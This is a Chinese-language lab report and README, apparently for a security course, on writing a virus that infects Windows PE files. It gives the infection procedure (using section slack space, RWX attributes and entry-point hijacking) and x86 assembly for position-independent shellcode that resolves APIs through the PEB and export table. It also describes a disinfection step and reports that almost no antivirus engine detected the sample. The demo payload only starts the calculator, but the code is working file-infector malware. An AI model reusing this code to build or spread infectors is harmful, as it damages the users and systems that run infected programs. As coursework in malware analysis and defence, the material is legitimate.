# PE-learning
PE 文件病毒编写
# 博客
https://blog.csdn.net/jmh1996/article/details/78494081

https://blog.csdn.net/jmh1996/article/details/104592450



实验目的：掌握PE文件格式；理解病毒感染PE文件的原理。
实验内容：
（1）	了解PE文件格式。
（2）	根据实验步骤，编程实现在PE文件中插入病毒代码。运行插入病毒代码后的PE文件。
（3）	编程实现在磁盘中搜索.exe文件的操作，对于所有的.exe文件插入病毒代码并运行插入病毒代码后的exe文件。
（4）	编程实现在磁盘中搜索(3)中的.exe文件的操作，对于所有的.exe文件删除病毒代码并运行删除病毒代码后的exe文件。。    


# 一、实验原理：
Win32的可执行文件，如*.exe、*.dll、*.ocx等，都是PE格式文件。感染PE格式文件的win32病毒，简称PE病毒。PE病毒同时也是所有病毒中数量极多、破坏性极大、技巧性最强的一类病毒。为了更好地发展反病毒技术，了解病毒的原理是极为必要的。一个PE病毒基本上需要具有重定位、截获API函数地址、搜索感染目标文件、内存文件映射、实施感染等几个功能，这也是病毒必须解决的几个基本问题。

PE病毒感染文件的基本步骤如下：
(1)	判断目标文件开始的两个字节是否为“MZ”。
(2)	判断PE文件标记“PE”。
(3)	判断感染标记，如果已被感染过则跳出继续执行HOST程序，否则继续。
(4)	获得Directory(数据目录)的个数，(每个数据目录信息占8个字节)。
(5)	得到节表起始位置。(Directory的偏移地址+数据目录占用的字节数=节表起始位置)。
(6)	遍历所有的节表，找到第一个具有可以容纳所有病毒代码空闲空间的节。
每个节的空闲空间的计算方法：
第i个节的空闲空间=第i+1个节的虚拟地址-第i个节的虚拟地址-第i个节的Misc.VirtualSize
(7)	开始写入目标代码：
1)	计算目标代码的文件偏移位置，以后目标代码将从该位置写入PE文件。其计算方法为：目标节表的Misc.VirtualSize+目标节表的PointerToRawData
2)	修改目标的节的节属性为0xE00000E0，是目标节变成可读、可写、可执行。
3)	写入目标代码的数据段
4)	写入目标代码的执行主体
5)	修改AddressOfEntryPoint(即程序入口点指向病毒入口位置)，同时保存旧的AddressOfEntryPoint，以便返回HOST继续执行。
6)	更新SizeOfImage(内存中整个PE映像尺寸=原SizeOfImage+病毒节经过内存节对齐后的大小)。SizeOfCode 代码的大小，即是原SizeOfCode+病毒代码经内存对齐后的大小。
7)	写入感染标记，在感染标记后面写入旧的AddressOfEntryPoint利于解毒。

# 二、实验器材（设备、元器件）
（1）	学生每人一台PC，安装Windows操作系统。
# 三、实验步骤：
PE文件病毒
1．编制一个输出为“hello world!”的简单程序，运行后得到hello.exe文件。
2．编制一个简单的病毒代码，该病毒可以启动系统的计算器程序。
3．编制程序在hello.exe文件中插入病毒代码，并运行插入代码后的hello.exe。
4．运行解毒代码，对刚刚的被感染的hello.exe进行解题，使病毒代码得不到执行。

# 四、实验数据及结果分析：
## 1、	编写宿主程序hello.exe:
int main()
{
	printf("Hello world!.....\n");
	system("pause");
		return 0;
}
	运行效果：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301145434425.png)
## 2、	编写病毒代码

病毒代码的基本思路为：

A. 首先通过TEB动态获取KernalBase32.dll的基地址
B. 然后在KernalBase32的进程空间进行搜索，寻找到GetProcAddress()函数的函数地址。
GetProcAddress()函数的函数原型为：
```c
FARPROC GetProcAddress(
HMODULE hModule, // DLL模块句柄
LPCSTR lpProcName // 函数名
);
```
通过这个函数可以获取指定函数在某个dll里面的函数地址。
我们会使用这个函数获取LoadLibraryExa函数以及system()函数的地址。
LoadLibraryExa的函数原型为：
```c
HMODULE WINAPI LoadLibraryEx(
  _In_       LPCTSTR lpFileName,//DLL文件的文件名，例如“msvcr120.dll”
  _Reserved_ HANDLE  hFile,//保留字，设置为0
  _In_       DWORD   dwFlags//标志位，设置为0x10，以最高权限加载dll
);
```
LoadLibraryExa函数用于加载某个dll文件，在本实验中用于加载msvcr120.dll,而system()存在于msvcr120.dll,我们用类似于system(“calc.exe”)的调用方法来通过system()启动计算器程序。
C. 考虑到病毒代码要使用需要数据，因此会在代码前添加数据段。


### 病毒代码的布局为：

数据区共96个字节
包括：
```
旧的AddressOfEntryPoint,程序入口（4个字节）
Baseofmsvcr120;目标dll文件的基地址（4个字节）
AddOfFunction;目标函数（system）的函数地址（4字节），该函数将会被执行。
addOfcurrent;病毒代码的虚拟地址，用于重定位(4字节)
dllname；需要载入的目标dll的文件名，（16字节），也就是“msvcr120.dll”
functionname;目标dll里面需要执行的函数（16字节），也就是“system”
info;functionname函数的参数（16字节），也就是“calc.exe”
loadLibrarayEx; LoadLibraryExa的字符串（16字节）
pLoadLibraryExa;LoadLibraryExa函数的地址（4字节）
kernalBase; KernalBase的基地址（4字节）
getProcAddr; getProcAddress函数的基地址（4字节）
他们的定义为：
//病毒代码块
			//数据区
			DWORD oldEntry = fileh.OptionalHeader.AddressOfEntryPoint;//-92
			DWORD baseOfmsvcr120 = 0;//-88
			DWORD addOfprintf = 0;//-84
			DWORD addOfcurrent = 0;//-80
			char dllname[16] = "msvcr120.dll";//-76
			char functionname[16] = "system";//-60
			char info[16] = "calc.exe";//-44
			char loadlibraryEx[16] = "LoadLibraryExA";//-28
			DWORD pLoadLibraryExA = 0;//-12
			DWORD kernelBase = 0;//-8
			DWORD getProcAddr = 0;//-4
```

### 代码执行区的设计：

首先需要进行重定位，通过
```asm
call A
				A :
				pop edi		
				//可能会有一定偏移
				sub edi,5
				mov [edi-80], edi;//assign current address.
```
将当前内存地址保存到edi中，此时edi先低地址偏移80个单位就是数据区中addOfcurrent所在的内存单元。注意edi需要先减去5个字节，因为call和pop指令占据了5个字节。减去5个字节后，edi就是执行数据区getProcAddr的末尾。

接着获取KernalBase32的基地址：
```a
mov eax, fs:[30h]
			mov eax, [eax + 0ch]
			mov eax, [eax + 1ch]
			mov eax, [eax]
				mov eax, [eax + 8h]
			mov [edi-8], eax;
```
这主要是通过PEB和TEB的结构来获取的，这种方法在Windows10,Windows7以及XP都可以正确的获取KernalBase32基地址。

接着搜索GetProcAddress函数的地址。
```asm
				mov edi, eax
					mov eax, [edi + 3Ch]
					mov edx, [edi + eax + 78h]
					add edx, edi; edx = 引出表地址
					mov ecx, [edx + 18h]; ecx = 输出函数的个数
					mov ebx, [edx + 20h]
					add ebx, edi; ebx ＝函数名地址，AddressOfName

				search :
				dec ecx
					mov esi, [ebx + ecx * 4]
					add esi, edi; 依次找每个函数名称
					; GetProcAddress
					mov eax, 0x50746547
					cmp[esi], eax; 'PteG'
					jne search
					mov eax, 0x41636f72
					cmp[esi + 4], eax; 'Acor'
					jne search
					; 如果是GetProcA，表示找到了
					mov ebx, [edx + 24h]
					add ebx, edi; ebx = 序号数组地址, AddressOf
					mov cx, [ebx + ecx * 2]; ecx = 计算出的序号值
					mov ebx, [edx + 1Ch]
					add ebx, edi; ebx＝函数地址的起始位置，AddressOfFunction
					mov eax, [ebx + ecx * 4]
					add eax, edi; 利用序号值，得到出GetProcAddress的地址
					sub eax, 0xb0
					pop edi
					mov ebx, edi;
					mov [ebx-4], eax;//GetProcAddress的地址
```
这主要通过搜索，搜索得到“GetProcAddress”这个名字，然后通过这个名字根据导出表的结构由北桥查询得到GetProcAddress的地址，并将其保存在数据区的getProcAdd里面。

然后通过GetProcAddree获取LoadLibraryExa的地址：

```q
sub ebx,28
				push ebx
				add ebx,28
				push [ebx-8];
				call [ebx-4];
			mov [ebx-12], eax;//LoadLibrary的地址
再通过LoadLibraryExa载入msvcr120.dll这个动态链接库：
				push 0x00000010
					push 0x00000000
					
					sub ebx,76
					push ebx
					add ebx,76
					//push eax
				call [ebx-12]

					mov [ebx-88], eax;
```
	
其中ebx-76正是数据区中“msvcr120.dll”这个字符串的地址。这个库的句柄保存下来

接着得到system的地址：
```a
mov edx, eax
					sub ebx,60
					push ebx
					add ebx,60
					push edx
				call [ebx-4];//得到system的地址
mov [ebx-84], eax;
```


调用system函数：

```a
sub ebx,44
					push ebx
					add ebx,44
				call eax
```

恢复堆栈：
```a
					add esp, 400h
					pop ecx
					pop esp
					pop ebp
					pop edx

					pop esi
					pop eax
				pop ebx;
```

调转回原来的入口点：
```a
					mov eax, fs:[30h]
					mov eax, DWORD PTR [eax+8]
					add eax, [edi-92]
					mov edi,eax
					pop eax
				jmp edi
```

注意原来入口的地址需要动态的计算，数据区的oldEntryAddress只是保存了旧的入口点的相对偏移地址。我们需要把这个相对偏移地址加上进程本身的基地址以此获得虚拟地址。

## 3、	编写感染代码
感染代码主要是检查目标文件是否是PE文件，是否被感染，如果可以感染那么将病毒代码插入到目标PE文件里面。
	本实验使用DOS紧跟着的8个字节作为感染标志，如果DOS后面的4个字节为0x06060606则说明已经感染，后面的4个字节是旧的地址用于解毒用。
	如果未感染，则：
1、	获取PE文件的所有节表
2、	搜索那个节表有足够的空闲来容纳病毒代码
3、	将病毒代码写入PE文件的合适节中
4、	修改SizeOfImage,SizeOfCode,以及被修改节的节属性
5、	加入感染标记，将PE文件DOS后面的4个字节设置为0x06060606,同时将旧的程序入口点保存在0x06060606后面
6、	修改PE文件的程序入口点。

## 4、	编写解毒代码
   解毒的过程很简单，因为我们在感染的时候会将宿主程序的真正入口保存在感染标记的后面，所以我们只需要获取宿主程序的真正入口点，将宿主程序的入口点修改回去即可，这样病毒代码就不会得到执行了。

## 5、	运行结果
我们设置宿主程序为1中的hello.exe，感染前该程序的运行效果为：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150008696.png)
我们运行病毒程序对宿主程序进行感染：
病毒程序感染中：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150030237.png)
运行感染后的宿主程序：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150044778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ptaDE5OTY=,size_16,color_FFFFFF,t_70)
宿主程序在打印Hello world之前启动了计算器程序，说明感染成功
我们使用IDA查看宿主程序，也可以看到病毒代码被成功插入到宿主中：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150102206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ptaDE5OTY=,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150109361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ptaDE5OTY=,size_16,color_FFFFFF,t_70)
接着我们运行解毒程序，对宿主程序进行解毒：
解毒程序解毒中：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030115012393.png)
再运行宿主程序：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030115013677.png)
我们可以发现，宿主程序又恢复了正常，并没有启动计算器程序。因此解毒成功！
# 五、实验结论、心得体会和改进建议：

本实验通过实际编写一个PE程序的病毒代码、感染模块、解毒模块，对PE文件的格式掌握的更加透彻。本实验通过搜索PE文件中带有空闲地址空间的节来把病毒代码插入到空闲的空间中。然后再修改相应的字段，修改节的属性，修改入口点，添加感染标志。感染后的程序运行结构显示病毒成功的感染了宿主程序，并且在宿主程序运行之前抢先拿到了控制权，启动了一个计算器程序后又将控制权返还给宿主程序。实验相当成功。

另外本人将病毒程序上传至在线病毒扫描网站，以测试该病毒程序能否被杀毒软件识别，其查杀的结果如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150206533.png)
共测试了39个知名杀毒软件，只有1个杀毒软件准确的识别了该病毒程序。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200301150220274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ptaDE5OTY=,size_16,color_FFFFFF,t_70)
卡巴斯基、赛门铁克、瑞星、奇虎360都没有准确的识别出来。这说明，传统杀毒软件在面对未爆发的新型病毒时的局限性，尽管这还是一个普通的PE病毒。

# 六、对本实验过程及方法、手段的改进建议：
实验指导书上建议是直接在PE文件新增加一个节来插入病毒代码，实际上该工作量特别复杂。因为插入一个新的节以后，节表要么需要插入一个新节表项，这就需要对节表项后面的所有的节进行偏移，这个过程很容易出错；要么就直接把最后一个节表（一般是空闲的节表）进行修改，这样就无须对节进行偏移，但是并不是所有的PE文件都会预留一个空白的节表项。

因此本实验采用的是将病毒代码插入到节的空隙中的方式，通过这个方式无须对节进行偏移，无须关心修改后的PE文件的对齐问题。

另外也可以将病毒代码直接附在最后的一个节的末尾和原来最后一个节的内容合并起来变成一个大的节，这个无须添加新的节表项，不存在节的偏移问题。


